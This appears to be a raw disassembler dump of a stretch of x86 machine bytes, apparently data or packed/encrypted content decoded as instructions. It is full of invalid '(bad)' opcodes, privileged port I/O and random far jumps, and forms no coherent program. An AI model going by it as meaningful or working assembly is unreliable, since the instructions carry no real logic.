  42dcb6:	xor    bh,dl
  42dcb8:	lea    esp,[ecx+0x15772289]
  42dcbe:	mov    al,0x7c
  42dcc0:	inc    edx
  42dcc1:	mov    bh,0xae
  42dcc3:	fcomp  QWORD PTR [ecx]
  42dcc5:	icebp  
  42dcc6:	pop    esp
  42dcc7:	mov    esi,0xc83dd4bc
  42dccc:	imul   esi,DWORD PTR [eax+ebx*2+0x20ccf17b],0x6b6d4e31
  42dcd7:	hlt    
  42dcd8:	stos   DWORD PTR es:[edi],eax
  42dcd9:	sbb    edi,DWORD PTR [esi]
  42dcdb:	add    BYTE PTR [edi+0x5bd13725],bl
  42dce1:	pop    ecx
  42dce2:	popf   
  42dce3:	inc    ecx
  42dce4:	and    eax,0xb9686400
  42dce9:	fwait
  42dcea:	mov    esi,esp
  42dcec:	push   0x61
	...
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	push   ss
  42dd63:	jg     0x42dd96
  42dd65:	out    0x67,al
  42dd67:	jmp    0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    BYTE PTR [eax-0x1120c1df],bl
  42dd73:	add    bh,BYTE PTR [ebx-0x1e]
  42dd76:	dec    ebx
  42dd77:	out    dx,eax
  42dd78:	mov    ds:0xaa7f3180,eax
  42dd7d:	repz cs jb 0x42dd5a
  42dd81:	adc    eax,0x2cddcbd
  42dd86:	or     al,0xa1
  42dd88:	push   0x88de38a3
  42dd8d:	test   al,0x6b
  42dd8f:	mov    bl,0x41
  42dd91:	hlt    
  42dd92:	(bad)  [esi+0x94ce577]
  42dd98:	jnp    0x42ddc1
  42dd9a:	and    ebp,DWORD PTR [eax+ebp*2-0x5b]
  42dd9e:	dec    edx
  42dd9f:	(bad)  
  42dda0:	jle    0x42de15
  42dda2:	inc    eax
  42dda3:	cdq    
  42dda4:	(bad)  
  42dda5:	sub    DWORD PTR [ebp-0x188c5ba2],esi
  42ddab:	out    dx,al
  42ddac:	add    BYTE PTR [ebp-0x70],0xa7
  42ddb0:	les    eax,FWORD PTR [ebx-0x35]
  42ddb3:	shr    BYTE PTR [eax],cl
  42ddb5:	test   BYTE PTR [ebp+ebp*2+0x73],ch
  42ddb9:	std    
  42ddba:	test   al,0x1b
  42ddbc:	sub    edi,DWORD PTR ds:0xb16dc173
  42ddc2:	add    DWORD PTR [ebp-0x53a715a7],esp
  42ddc8:	fwait
  42ddc9:	xor    eax,DWORD PTR [ecx+0x32]
  42ddcc:	jmp    FWORD PTR [edx]
  42ddce:	pop    edi
  42ddcf:	in     al,0xb0
  42ddd1:	test   BYTE PTR [ebx-0x30bc8fce],dl
  42ddd7:	sbb    eax,0xe3b75456
  42dddc:	mov    ch,bh
  42ddde:	xchg   esp,eax
  42dddf:	sbb    BYTE PTR [edx],bl
  42dde1:	in     al,0x44
  42dde3:	lds    ebp,FWORD PTR [esi+0x11]
  42dde6:	push   ss
  42dde7:	pop    edx
  42dde8:	and    al,0xfc
  42ddea:	aas    
  42ddeb:	sub    al,0xdf
  42dded:	stc    
  42ddee:	adc    eax,DWORD PTR [edx+0x39eb43ca]
  42ddf4:	xchg   ebp,eax
  42ddf5:	fcmovnu st,st(4)
  42ddf7:	idiv   dh
  42ddf9:	push   ecx
  42ddfa:	cs cmc 
  42ddfc:	jbe    0x42de3d
  42ddfe:	sbb    DWORD PTR ds:0x3f7a331b,ecx
  42de04:	mov    ch,0xd7
  42de06:	cmp    esi,eax
  42de08:	inc    ebp
  42de09:	(bad)  
  42de0a:	popa   
  42de0b:	jno    0x42ddd9
  42de0d:	and    edi,DWORD PTR [esi+0x2fe0ff2a]
  42de13:	add    DWORD PTR [edi-0x19aca2cc],ebx
  42de19:	fld    QWORD PTR [ebp+ebp*1+0x145e0980]
  42de20:	lods   al,BYTE PTR ds:[esi]
  42de21:	cwde   
  42de22:	das    
  42de23:	jb     0x42ddd7
  42de25:	rcr    BYTE PTR [ebx+0x4a5b9825],0x75
  42de2c:	mov    WORD PTR [edx-0x3c],ds
  42de2f:	arpl   WORD PTR [esi+0x4f],sp
  42de32:	push   edx
  42de33:	or     esp,DWORD PTR [edx+0x59]
  42de36:	rol    BYTE PTR [ebp+0x25f65cb9],1
  42de3c:	pop    ds
  42de3d:	xor    ebp,ebx
  42de3f:	sbb    al,0x34
  42de41:	push   ecx
  42de42:	or     esi,DWORD PTR [ecx]
  42de44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de45:	push   eax
  42de46:	xor    bh,BYTE PTR [edx]
  42de48:	enter  0xd43b,0xd9
  42de4c:	mov    ebp,0x31c63acc
  42de51:	add    BYTE PTR [edx],dl
  42de53:	in     al,dx
  42de54:	out    dx,al
  42de55:	and    ecx,edi
  42de57:	or     DWORD PTR [eax-0x7e],esi
  42de5a:	adc    BYTE PTR [esi+0x5e],0x1e
  42de5e:	rol    DWORD PTR [edi],cl
  42de60:	mov    dl,al
  42de62:	push   ss
  42de63:	mov    ebp,0x16c8fe3a
  42de68:	jle    0x42de8c
  42de6a:	mov    eax,0xae7bc
	...
  42ded3:	add    BYTE PTR [eax],al
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	xor    al,0x57
  42dee4:	mov    DWORD PTR [esi],edi
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	js     0x42def7
  42def0:	dec    ebx
  42def1:	fcomp  QWORD PTR [ebp+0x1168024]
  42def7:	out    dx,eax
  42def8:	ret    0x6cb
  42defb:	xor    DWORD PTR [edi+eiz*4],edi
  42defe:	fstp   QWORD PTR [ebp-0x78]
  42df01:	mov    ah,0xf0
  42df03:	mov    dh,0xe4
  42df05:	jmp    0x42df6c
  42df07:	cmp    edi,esp
  42df09:	mov    esi,0xc0af9169
  42df0e:	inc    ebx
  42df0f:	sub    al,0x58
  42df11:	in     eax,0x9e
  42df13:	sti    
  42df14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df15:	sub    eax,eax
  42df17:	outs   dx,DWORD PTR ds:[esi]
  42df18:	inc    ebp
  42df19:	jl     0x42df34
  42df1b:	xor    eax,DWORD PTR [esi+0x74cc59d0]
  42df21:	shl    dl,cl
  42df23:	in     al,0xf2
  42df25:	dec    eax
  42df26:	dec    eax
  42df27:	in     eax,0x86
  42df29:	or     edx,esi
  42df2b:	sti    
  42df2c:	ins    DWORD PTR es:[edi],dx
  42df2d:	mov    dh,0x75
  42df2f:	xchg   edi,eax
  42df30:	sub    esp,ecx
  42df32:	fcmovu st,st(1)
  42df34:	xor    eax,0x2aad396b
  42df39:	add    DWORD PTR [edx],eax
  42df3b:	ret    
  42df3c:	shl    BYTE PTR [ecx+0x32],1
  42df3f:	popa   
  42df40:	jo     0x42dfb8
  42df42:	cmp    BYTE PTR [ecx-0x67f8c75c],cl
  42df48:	sub    dl,BYTE PTR [edx]
  42df4a:	cmp    DWORD PTR [ebx+edi*1-0x70],ecx
  42df4e:	repnz pushf 
  42df50:	add    DWORD PTR [eax],ebp
  42df52:	mov    DWORD PTR [esp+ebx*1-0x16],edx
  42df56:	sbb    dl,BYTE PTR [esi-0x72]
  42df59:	in     al,0x4e
  42df5b:	or     DWORD PTR [esi-0x5c],edi
  42df5e:	mov    BYTE PTR [esi-0x6d],0x9
  42df62:	push   ebp
  42df63:	cmp    ebx,DWORD PTR [ebx-0x67]
  42df66:	pop    ecx
  42df67:	fcomp  QWORD PTR [ecx+0x44]
  42df6a:	and    BYTE PTR [edx+0xd6888a3],dl
  42df70:	mov    DWORD PTR [edx-0x15],eax
  42df73:	mov    edi,0xd1bf214e
  42df78:	or     DWORD PTR [edi],eax
  42df7a:	mov    ebx,ds
  42df7c:	fstp   QWORD PTR [edx+0x5928519e]
  42df82:	xor    eax,0x1227d43a
  42df87:	xchg   edx,eax
  42df88:	ret    
  42df89:	add    BYTE PTR [edx-0x31],dh
  42df8c:	cmp    BYTE PTR [ecx],bl
  42df8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df8f:	out    dx,eax
  42df90:	xor    bh,BYTE PTR [edi+0x20a42331]
  42df96:	(bad)  
  42df97:	rol    DWORD PTR [edx-0x67],0x1d
  42df9b:	inc    ecx
  42df9c:	xor    eax,0x8d1e16a2
  42dfa1:	pop    ebx
  42dfa2:	pop    edx
  42dfa3:	lahf   
  42dfa4:	outs   dx,BYTE PTR ds:[esi]
  42dfa5:	inc    esi
  42dfa6:	sub    al,0xc5
  42dfa8:	cmp    eax,0xacbb3cc3
  42dfad:	daa    
  42dfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfaf:	ins    DWORD PTR es:[edi],dx
  42dfb0:	xchg   ebp,eax
  42dfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfb2:	jno    0x42dfc0
  42dfb4:	push   esi
  42dfb5:	pusha  
  42dfb6:	pushf  
  42dfb7:	add    BYTE PTR [eax],dh
  42dfb9:	mov    BYTE PTR [esi],bh
  42dfbb:	jmp    0x44c7:0x9a68fb5d
  42dfc2:	push   0xde6d09b1
  42dfc7:	pop    edi
  42dfc8:	add    eax,0xebc0c3e4
  42dfcd:	fcomp  QWORD PTR ds:0xe721ad9d
  42dfd3:	fst    QWORD PTR [eax-0x4c]
  42dfd6:	mov    dl,0x39
  42dfd8:	adc    al,0x2a
  42dfda:	pop    ebp
  42dfdb:	add    ch,BYTE PTR [eax*4-0x7f56b5c0]
  42dfe2:	sbb    al,0x54
  42dfe4:	not    DWORD PTR [edi]
  42dfe6:	cmc    
  42dfe7:	ins    BYTE PTR es:[edi],dx
  42dfe8:	mov    ds:0xda720fea,eax
  42dfed:	popf   
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x76]
  42e063:	jne    0x42e06b
  42e065:	adc    al,0x67
  42e067:	in     eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	fcom   DWORD PTR [edi+0x35]
  42e071:	pop    ecx
  42e072:	pop    esi
  42e073:	jecxz  0x42e05e
  42e075:	sub    edx,DWORD PTR [esi-0x512a9dd3]
  42e07b:	inc    ebx
  42e07c:	leave  
  42e07d:	sub    al,0x80
  42e07f:	scas   al,BYTE PTR es:[edi]
  42e080:	mov    edi,0x84732075
  42e085:	push   esp
  42e086:	pop    esp
  42e087:	xor    al,0xb2
  42e089:	pop    ss
  42e08a:	mov    es,WORD PTR [edx]
  42e08c:	cmp    al,BYTE PTR [eax-0x5210f5b6]
  42e092:	cli    
  42e093:	cmp    DWORD PTR [edx-0x74cd504c],esi
  42e099:	leave  
  42e09a:	inc    ecx
  42e09b:	movups xmm3,xmm7
  42e09e:	fsubr  DWORD PTR [edx+eiz*8+0x47bb321f]
  42e0a5:	jnp    0x42e0cc
  42e0a7:	lahf   
  42e0a8:	pushf  
  42e0a9:	fnclex 
  42e0ab:	test   al,0xf1
  42e0ad:	mov    edi,edi
  42e0af:	inc    ebx
  42e0b0:	dec    DWORD PTR [edx-0x90fd948]
  42e0b6:	mov    eax,0x5c18066c
  42e0bb:	adc    al,0x9d
  42e0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0be:	jbe    0x42e117
  42e0c0:	adc    dl,BYTE PTR [esi]
  42e0c2:	bound  eax,QWORD PTR ds:0xd0f94cf7
  42e0c8:	or     DWORD PTR [ecx-0xe],ebx
  42e0cb:	sub    bh,bh
  42e0cd:	push   ds
  42e0ce:	add    BYTE PTR [ecx+esi*2+0x1c],ch
  42e0d2:	cmp    al,0xbb
  42e0d4:	int    0xc1
  42e0d6:	inc    ebp
  42e0d7:	sub    cl,bl
  42e0d9:	sub    al,0xde
  42e0db:	push   ecx
  42e0dc:	jmp    0x42e106
  42e0de:	(bad)  
  42e0df:	sar    DWORD PTR [ebx],1
  42e0e1:	iret   
  42e0e2:	sub    edi,DWORD PTR [edx]
  42e0e4:	jp     0x42e092
  42e0e6:	adc    BYTE PTR [ecx+edx*2],bl
  42e0e9:	push   0x44613804
  42e0ee:	std    
  42e0ef:	jp     0x42e10d
  42e0f1:	rol    DWORD PTR [ebp+0x27a8bc8b],1
  42e0f7:	in     eax,dx
  42e0f8:	dec    ebx
  42e0f9:	push   edi
  42e0fa:	std    
  42e0fb:	out    0x72,eax
  42e0fd:	mov    esp,ecx
  42e0ff:	les    ecx,FWORD PTR [edx]
  42e101:	and    ecx,DWORD PTR [ecx-0x2]
  42e104:	aas    
  42e105:	test   al,0x7a
  42e107:	cli    
  42e108:	sahf   
  42e109:	sbb    DWORD PTR [edx-0x3b],edi
  42e10c:	mov    ds:0xc6f41782,al
  42e111:	test   eax,0xc38badd3
  42e116:	mov    eax,0x93caebd1
  42e11b:	or     BYTE PTR [ebx],al
  42e11d:	(bad)  
  42e11e:	adc    al,0x2d
  42e120:	inc    edx
  42e121:	push   edx
  42e122:	shl    BYTE PTR [edi],1
  42e124:	and    BYTE PTR [ebp+0x50],0xd4
  42e128:	fsubr  QWORD PTR [edx-0xa]
  42e12b:	cdq    
  42e12c:	inc    eax
  42e12d:	cmp    dh,BYTE PTR [eax+0xc709467]
  42e133:	fcomp  DWORD PTR [edx]
  42e135:	jle    0x42e142
  42e137:	adc    ah,bh
  42e139:	mov    edx,0xf64a5d61
  42e13e:	adc    BYTE PTR gs:[ecx+0x6aa77705],cl
  42e145:	repnz cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42e148:	cmp    BYTE PTR [edx],ah
  42e14a:	cmp    ebx,DWORD PTR [esi]
  42e14c:	inc    DWORD PTR [bp+di]
  42e14f:	ficom  DWORD PTR [esi]
  42e151:	pop    edx
  42e152:	mov    al,ds:0x2185a5e7
  42e157:	aaa    
  42e158:	popf   
  42e159:	pop    ebp
  42e15a:	push   0x24369859
  42e15f:	scas   eax,DWORD PTR es:[edi]
  42e160:	hlt    
  42e161:	sbb    eax,0x69500504
  42e166:	adc    BYTE PTR [esi],bl
  42e168:	mov    esp,0xd213ade8
  42e16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42e1d6:	mov    eax,ds:0x7e061ecf
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	jb     0x42e21f
  42e1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1e5:	loop   0x42e24e
  42e1e7:	out    dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	dec    eax
  42e1ef:	and    ebp,DWORD PTR [edx-0x3ac23b8]
  42e1f5:	adc    edx,ebp
  42e1f7:	leave  
  42e1f8:	(bad)  
  42e1f9:	mov    ecx,0x4fa0e198
  42e1fe:	lds    edx,FWORD PTR [ecx+0x2c]
  42e201:	gs mov bh,0x86
  42e204:	push   ds
  42e205:	cmp    edx,ebx
  42e207:	std    
  42e208:	adc    dh,ch
  42e20a:	fld    TBYTE PTR [edi-0x26]
  42e20d:	fdiv   QWORD PTR [edi-0x2b359ac9]
  42e213:	adc    esi,DWORD PTR [ebx]
  42e215:	ret    
  42e216:	lds    esp,FWORD PTR [eax]
  42e218:	push   ebp
  42e219:	push   ss
  42e21a:	popf   
  42e21b:	pop    edi
  42e21c:	lea    ebx,[ecx-0x60]
  42e21f:	pop    ds
  42e220:	jp     0x42e250
  42e222:	or     BYTE PTR [edi],dh
  42e224:	pop    esi
  42e225:	stos   BYTE PTR es:[edi],al
  42e226:	push   ebx
  42e227:	lea    eax,[esi*2+0x723fb52c]
  42e22e:	(bad)  
  42e22f:	out    0xf6,eax
  42e231:	call   0x4399:0x1caf461
  42e238:	mov    al,0xab
  42e23a:	push   esp
  42e23b:	(bad)  
  42e23c:	push   esp
  42e23d:	dec    ebp
  42e23e:	stos   BYTE PTR es:[edi],al
  42e23f:	les    eax,FWORD PTR [edx+0x637aca1a]
  42e245:	mov    ds:0x5c95ef84,ax
  42e24b:	mov    bh,0x70
  42e24d:	pushf  
  42e24e:	push   0x9efa1142
  42e253:	or     DWORD PTR [edx+0x61],edi
  42e256:	call   0x4f26:0xb98b66d0
  42e25d:	out    dx,al
  42e25e:	outs   dx,DWORD PTR ds:[esi]
  42e25f:	add    al,0x84
  42e261:	stc    
  42e262:	ins    DWORD PTR es:[edi],dx
  42e263:	mov    ds:0x1c7576dc,eax
  42e268:	sbb    esi,DWORD PTR [edi]
  42e26a:	pop    ds
  42e26b:	inc    ebx
  42e26c:	cmp    al,0xc1
  42e26e:	push   cs
  42e26f:	push   cs
  42e270:	cld    
  42e271:	and    BYTE PTR [ebx+ebp*4+0x7f31f054],dl
  42e278:	cmp    ebx,ebx
  42e27a:	adc    DWORD PTR [ebp+0x526344a1],ebp
  42e280:	inc    edx
  42e281:	xchg   ebx,eax
  42e282:	sub    al,0xf8
  42e284:	pop    DWORD PTR [ebp-0x1c]
  42e287:	xor    eax,0xc6065013
  42e28c:	int    0x88
  42e28e:	pop    ecx
  42e28f:	push   edi
  42e290:	mov    esi,DWORD PTR [ecx]
  42e292:	adc    DWORD PTR [ecx+ebx*8],ebx
  42e295:	fsub   st(7),st
  42e297:	push   edi
  42e298:	push   esp
  42e299:	xchg   esi,eax
  42e29a:	loopne 0x42e26b
  42e29c:	xor    dl,BYTE PTR [edx+0x22cd6d72]
  42e2a2:	fs push es
  42e2a4:	mov    bh,0x99
  42e2a6:	(bad)  
  42e2a7:	fstp   DWORD PTR [ecx-0x448012c7]
  42e2ad:	dec    esp
  42e2ae:	imul   esp,edx,0xffffffa5
  42e2b1:	aaa    
  42e2b2:	sub    al,0x21
  42e2b4:	add    edi,DWORD PTR [ecx+ebx*2+0x23]
  42e2b8:	int    0x60
  42e2ba:	in     al,dx
  42e2bb:	xchg   esi,eax
  42e2bc:	inc    esp
  42e2bd:	lahf   
  42e2be:	or     BYTE PTR [ebx+0x3152b418],dh
  42e2c4:	dec    esi
  42e2c5:	push   ds
  42e2c6:	int3   
  42e2c7:	call   0x1239:0x9aa31b04
  42e2ce:	push   esp
  42e2cf:	pop    esi
  42e2d0:	mov    dl,BYTE PTR [ebx+0x3c]
  42e2d3:	cs nop
  42e2d5:	sbb    al,BYTE PTR [edx+0x39685056]
  42e2db:	aas    
  42e2dc:	aaa    
  42e2dd:	lahf   
  42e2de:	adc    eax,0x4e2fd7e0
  42e2e3:	mov    al,ds:0xd6d44a8d
  42e2e8:	daa    
  42e2e9:	aad    0x17
  42e2eb:	cmc    
  42e2ec:	je     0x42e281
	...
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0x7199140
  42e363:	push   esi
  42e364:	push   0x1ef6751
  42e369:	add    BYTE PTR [eax],al
  42e36b:	add    DWORD PTR [eax],eax
  42e36d:	add    BYTE PTR [ebx+eiz*8],bh
  42e370:	dec    esi
  42e371:	sub    DWORD PTR [eax],eax
  42e373:	xchg   esi,eax
  42e374:	outs   dx,BYTE PTR ds:[esi]
  42e375:	fistp  QWORD PTR [eax-0x6c]
  42e378:	gs inc edi
  42e37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e37b:	push   0x6a
  42e37d:	dec    ecx
  42e37e:	add    al,0x5d
  42e380:	stos   BYTE PTR es:[edi],al
  42e381:	nop
  42e382:	lea    edi,[ebp+0x4dbc7eed]
  42e388:	pop    ecx
  42e389:	xchg   esp,eax
  42e38a:	cmp    BYTE PTR [ecx+0x26],cl
  42e38d:	ffree  st(0)
  42e38f:	or     DWORD PTR [edx+edi*2+0x7a],ebx
  42e393:	push   ebx
  42e394:	loop   0x42e37e
  42e396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e397:	add    ah,BYTE PTR [ecx]
  42e399:	in     eax,dx
  42e39a:	aaa    
  42e39b:	xchg   ebx,eax
  42e39c:	sbb    esp,DWORD PTR [edx-0x39]
  42e39f:	jnp    0x42e3c9
  42e3a1:	ror    dl,1
  42e3a3:	repz xor ebp,DWORD PTR [eax+eiz*1]
  42e3a7:	xor    DWORD PTR [ecx-0x4b],edx
  42e3aa:	jmp    0x65b6d3a3
  42e3af:	jge    0x42e3e6
  42e3b1:	retf   
  42e3b2:	icebp  
  42e3b3:	pop    ecx
  42e3b4:	dec    edx
  42e3b5:	inc    eax
  42e3b6:	push   edi
  42e3b7:	cmp    al,0xb4
  42e3b9:	retf   
  42e3ba:	mov    ecx,0x82a80131
  42e3bf:	mov    bl,0x2b
  42e3c1:	fs jge 0x42e37d
  42e3c4:	sbb    al,0x76
  42e3c6:	dec    edi
  42e3c7:	lods   eax,DWORD PTR ds:[esi]
  42e3c8:	cdq    
  42e3c9:	push   edi
  42e3ca:	repz push ds
  42e3cc:	sub    DWORD PTR [eax+0x69755181],edx
  42e3d2:	sub    al,0x32
  42e3d4:	out    0xd0,al
  42e3d6:	xchg   ebp,eax
  42e3d7:	lods   eax,DWORD PTR ds:[esi]
  42e3d8:	push   ebp
  42e3d9:	add    esp,DWORD PTR [ebx-0x3b]
  42e3dc:	aas    
  42e3dd:	xor    DWORD PTR [ebp+0x54d293d0],esp
  42e3e3:	xor    ebp,eax
  42e3e5:	sub    eax,0x5709334
  42e3ea:	mov    esi,0x5247aabf
  42e3ef:	scas   eax,DWORD PTR es:[edi]
  42e3f0:	repz jmp 0xd484810c
  42e3f6:	sti    
  42e3f7:	fsub   st(0),st
  42e3f9:	or     al,0x9f
  42e3fb:	loopne 0x42e3ee
  42e3fd:	inc    ebx
  42e3fe:	stos   BYTE PTR es:[edi],al
  42e3ff:	mov    bl,0x1b
  42e401:	inc    edi
  42e402:	or     BYTE PTR [edx],cl
  42e404:	sub    al,BYTE PTR [ebp-0x5b]
  42e407:	or     DWORD PTR ds:0x537c8614,esi
  42e40d:	int3   
  42e40e:	sub    bh,al
  42e410:	aam    0xe6
  42e412:	pop    esi
  42e413:	icebp  
  42e414:	imul   esp,DWORD PTR [ebp-0x42721a9d],0xffffffcb
  42e41b:	mov    al,ds:0x54b63f9
  42e420:	jb     0x42e45c
  42e422:	or     al,0xe9
  42e424:	mov    ds:0xdd407075,al
  42e429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e42a:	rol    esi,0x7e
  42e42d:	lea    edi,ds:[esi]
  42e430:	jmp    0x8e1d:0x7b667b11
  42e437:	push   eax
  42e438:	lods   eax,DWORD PTR ds:[esi]
  42e439:	and    al,0x79
  42e43b:	xlat   BYTE PTR ds:[ebx]
  42e43c:	stos   BYTE PTR es:[edi],al
  42e43d:	ja     0x42e3d0
  42e43f:	neg    dh
  42e441:	and    cl,dl
  42e443:	add    al,0xb9
  42e445:	ss retf 0xa3d3
  42e449:	jmp    0xe63b5c21
  42e44e:	pop    esi
  42e44f:	xchg   edi,eax
  42e450:	imul   eax,eax,0xffffffa9
  42e453:	sbb    BYTE PTR [ecx],bl
  42e455:	popa   
  42e456:	lock push edx
  42e458:	and    eax,0x5b7f9d9f
  42e45d:	std    
  42e45e:	adc    ah,BYTE PTR [ebx+0x2d]
  42e461:	jns    0x42e431
  42e463:	xor    DWORD PTR [eax],esp
  42e465:	push   esp
  42e466:	cld    
  42e467:	dec    esi
  42e468:	cmp    ebp,DWORD PTR [edx-0x7ed81dd7]
	...
  42e4d6:	loop   0x42e495
  42e4d8:	fadd   st(7),st
  42e4da:	(bad)  
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	mul    DWORD PTR [ecx+0x4d]
  42e4e5:	jmp    0x100:0x1f067
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	sub    eax,0x57560feb
  42e4f3:	cmpps  xmm7,XMMWORD PTR [edx-0x5bd1028e],0xb6
  42e4fb:	popf   
  42e4fc:	iret   
  42e4fd:	retf   0x499e
  42e500:	loop   0x42e57e
  42e502:	or     al,0xa3
  42e504:	cmp    ch,BYTE PTR [ecx+ecx*2]
  42e507:	icebp  
  42e508:	mov    dl,BYTE PTR [edx+0x7510be6e]
  42e50e:	push   es
  42e50f:	sub    al,0x79
  42e511:	sub    al,0x2
  42e513:	mov    esi,0x981b7fe
  42e518:	call   0xbb65:0x36bbfbe6
  42e51f:	cmp    DWORD PTR [edx+0x10166769],edx
  42e525:	xchg   BYTE PTR [ebp-0x4c],bh
  42e528:	mov    DWORD PTR [eax+0x2fecae22],edx
  42e52e:	push   ds
  42e52f:	pop    ss
  42e530:	iret   
  42e531:	push   ebp
  42e532:	arpl   WORD PTR [edi-0x3347b7f],sp
  42e538:	nop
  42e539:	xor    al,bl
  42e53b:	mov    ecx,0x9597e980
  42e540:	fs in  eax,0x7f
  42e543:	xchg   edx,eax
  42e544:	addr16 sub eax,0xdb9b502b
  42e54a:	test   DWORD PTR [ebx+0x51],esp
  42e54d:	mov    ebp,ebp
  42e54f:	adc    BYTE PTR [ebp-0x15],bl
  42e552:	ror    DWORD PTR [ecx],0x87
  42e555:	and    ebp,DWORD PTR [ebx+eiz*2+0x21cc469]
  42e55c:	loop   0x42e555
  42e55e:	adc    al,0x81
  42e560:	pop    sp
  42e562:	mov    al,ds:0x9ccbeeb9
  42e567:	cs sub al,0x76
  42e56a:	cwde   
  42e56b:	mov    DWORD PTR ds:0x1a9fe11d,edx
  42e571:	mov    edi,0xc1da753f
  42e576:	in     al,dx
  42e577:	cmp    al,0x40
  42e579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e57a:	and    edx,DWORD PTR [ebx-0x6a54abf7]
  42e580:	mov    ah,0xf4
  42e582:	jmp    0x5ef481a8
  42e587:	data16 jns 0x42e540
  42e58a:	adc    BYTE PTR [edx+0x32af7c6c],ch
  42e590:	pusha  
  42e591:	(bad)  
  42e592:	mov    ah,0x65
  42e594:	cwde   
  42e595:	jl     0x42e56d
  42e597:	retf   0x429c
  42e59a:	jle    0x42e5b4
  42e59c:	fst    DWORD PTR [edx]
  42e59e:	or     BYTE PTR [ebx-0x5],dl
  42e5a1:	aad    0x64
  42e5a3:	clc    
  42e5a4:	sbb    bh,BYTE PTR [edi]
  42e5a6:	loope  0x42e5ab
  42e5a8:	push   ecx
  42e5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5aa:	mov    dl,0x37
  42e5ac:	retf   
  42e5ad:	adc    DWORD PTR [esi-0x552b1c58],eax
  42e5b3:	mov    ch,0x64
  42e5b5:	jmp    FWORD PTR [eax+0x4da886ef]
  42e5bb:	and    BYTE PTR [ecx+0x11],ah
  42e5be:	and    BYTE PTR [ecx],ah
  42e5c0:	inc    ebx
  42e5c1:	xor    eax,0x7813312e
  42e5c6:	push   esi
  42e5c7:	sbb    eax,0x6b348773
  42e5cc:	jecxz  0x42e55d
  42e5ce:	fsubr  DWORD PTR [esi]
  42e5d0:	fnstcw WORD PTR [ebx-0x6e7c5408]
  42e5d6:	jl     0x42e656
  42e5d8:	cmc    
  42e5d9:	shr    edx,cl
  42e5db:	cwde   
  42e5dc:	add    al,0xbc
  42e5de:	test   al,0x19
  42e5e0:	sbb    bh,BYTE PTR [eax-0x33929c12]
  42e5e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5e7:	jge    0x42e56e
  42e5e9:	and    ah,al
  42e5eb:	cmp    DWORD PTR [ecx-0xb],ecx
	...
  42e656:	push   ebp
  42e657:	cmp    dh,cl
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	dec    ebx
  42e663:	add    al,0xd4
  42e665:	pop    ds
  42e666:	addr16 icebp 
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	ret    0x1440
  42e671:	sub    ebx,ecx
  42e673:	pop    edi
  42e674:	mov    cl,0xd3
  42e676:	dec    edi
  42e677:	push   0x12
  42e679:	xor    al,0x35
  42e67b:	add    dl,bl
  42e67d:	es mov edi,0x8fd0ea4c
  42e683:	sub    BYTE PTR [edx],dh
  42e685:	mov    ds:0x35efff36,al
  42e68a:	icebp  
  42e68b:	(bad)  
  42e68c:	in     eax,dx
  42e68d:	mov    eax,0x25afeeeb
  42e692:	cdq    
  42e693:	rcr    esi,0xa8
  42e696:	xor    BYTE PTR [edx+ebx*1],0xd5
  42e69a:	imul   edx,DWORD PTR ds:0x1055ba01,0x2f
  42e6a1:	cmp    eax,0xb6909fa5
  42e6a6:	and    ecx,DWORD PTR [eax+0x4d]
  42e6a9:	int    0x59
  42e6ab:	mov    bh,0xc0
  42e6ad:	cli    
  42e6ae:	lds    ecx,FWORD PTR [esp+eiz*8+0x6cf77d9e]
  42e6b5:	push   ebp
  42e6b6:	lea    eax,[edx-0x24144f3a]
  42e6bc:	(bad)  [ecx+0x57]
  42e6bf:	add    eax,0xd9644236
  42e6c4:	pop    esp
